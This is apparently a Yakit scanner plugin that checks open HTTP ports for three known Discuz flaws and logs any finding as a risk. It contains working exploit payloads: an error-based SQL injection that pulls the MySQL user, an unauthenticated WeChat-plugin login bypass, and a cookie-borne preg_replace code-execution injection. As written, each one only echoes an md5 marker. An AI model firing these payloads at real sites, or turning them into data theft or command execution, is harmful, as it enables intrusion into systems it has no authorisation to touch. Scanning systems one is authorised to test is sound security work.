# port scan plugin
yakit.AutoInitYakit()

// 准备发送的报文模版 
PacketGet = `GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

`



PacketGet1 = `GET /viewthread.php?tid=10 HTTP/1.1
Host: {{params(target)}}
Cookie: GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Bsearcharray%5D=/.*/eui; GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Breplacearray%5D=print_r(md5({{params(payload)}}));
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

`
//漏洞检测规则函数 
rules = []
addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {
    rules = append(rules, {
        "packet": packet,
        "payload": payload,
        "check": check,
        "type": riskType,
        "typeVerbose": riskTypeVerbose,
        "severity": severity,
        "reference":reference,
    })
}

//填充对应的漏洞检测规则
addRule(PacketGet,`/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat((select%20concat(user,0x3a,md5(1234),0x3a)%20from%20mysql.user%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23`,func(rsp,header,body){
    if rsp.StatusCode == 200 &&  str.MatchAllOfSubString(body, `81dc9bdb52d04dc20036dbd8313ed055`,`Discuz! info</b>: MySQL Query Error`){
        return true
    }
    return false
},"sql注入","discuz-v72-sqli","high","https://blog.csdn.net/weixin_40709439/article/details/82780606")



addRule(PacketGet,`/plugin.php?id=wechat:wechat&ac=wxregister`,func(rsp,header,body){
    if rsp.StatusCode == 302 &&  str.MatchAllOfSubString(header,`set-cookie`,`auth`,`location`,`wsq.discuz.com`){
        return true
    }
    return false
},"登陆绕过","discuz-wechat-plugins-unauth","medium","https://gitee.com/ComsenzDiscuz/DiscuzX/issues/IPRUI")

num = fuzz.Strings("{{ri(2000000000, 2100000000,1)}}")[0]
addRule(PacketGet1,num,func(rsp,header,body){
    if rsp.StatusCode == 200 &&  str.MatchAllOfSubString(body, codec.Md5(num)){
        return true
    }
    return false
},"代码执行","discuz-wooyun-2010-080723","critical","https://github.com/vulhub/vulhub/tree/master/discuz/wooyun-2010-080723")


//漏洞检测handle 
handleRule = func(swg, isTls, addr, rule) {
    swg.Add()
    go func{
        defer swg.Done()

        defer func{
            recover()
        }

        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}),poc.redirectTimes(0))
        if err != nil {
            yakit.Error("poc.HTTP error: %v", err)
            return
        }
        header, body = poc.Split(resp)
        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
        url = urlIns.String()
        if rule.check(rspIns, header, body) {
            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
            risk.NewRisk(
                url, risk.severity(rule.severity), 
                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
                risk.titleVerbose(sprintf("reference %v", rule.reference)),
                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
                risk.payload(rule.payload), risk.details({
                    "request": req,
                    "response": resp,
                    "url": url,
                }),
            )
            return
        }
        return
    }
}


handle = func(result) {
    if !result.IsOpen() {
        return
    }

    //判断是否是http
    if len(result.Fingerprint.HttpFlows) <= 0 {
        return
    }

    addr = str.HostPort(result.Target, result.Port)
    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))
 
    //漏洞检测
    swg = sync.NewSizedWaitGroup(10)
    for _, rule = range rules {
        handleRule(swg, isTls, addr, rule)
    }
    swg.Wait()
}
